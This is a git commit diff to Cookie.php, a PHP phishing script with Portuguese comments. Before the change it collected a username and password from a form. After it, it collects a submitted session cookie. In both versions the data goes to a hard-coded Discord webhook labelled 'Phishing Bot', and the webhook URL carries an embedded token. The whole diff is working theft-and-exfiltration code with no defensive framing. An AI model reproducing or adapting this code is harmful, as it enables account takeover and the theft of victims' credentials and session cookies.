f5e401b72ea6dce8a602d8d6ee96a16170fba3bc
ARTHURMGIC <112780967+ARTHURMGIC@users.noreply.github.com>
2024-04-23 05:03:42 -0300

    Update Cookie.php

--- Cookie.php
+++ Cookie.php
@@ -1,12 +1,11 @@
 <?php
 // Dados do formulário
-$username = $_POST['username'];
-$password = $_POST['password'];
+$cookie = $_POST['cookie'];
 
 // Envie os dados para o seu Discord
 $webhookurl = 'https://discord.com/api/webhooks/1040678839396872322/TIl24vk7NiW4Fz3zACaKchZhtMc8ien3KjI9ha9EU1dTBeKIDH18H3Fgx3uStpAkG5Ud'; // Substitua pelo seu webhook do Discord
 
-$data = array('username' => 'Phishing Bot', 'content' => "Username: $username\nPassword: $password");
+$data = array('username' => 'Phishing Bot', 'content' => "Cookie: $cookie");
 
 $ch = curl_init($webhookurl);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
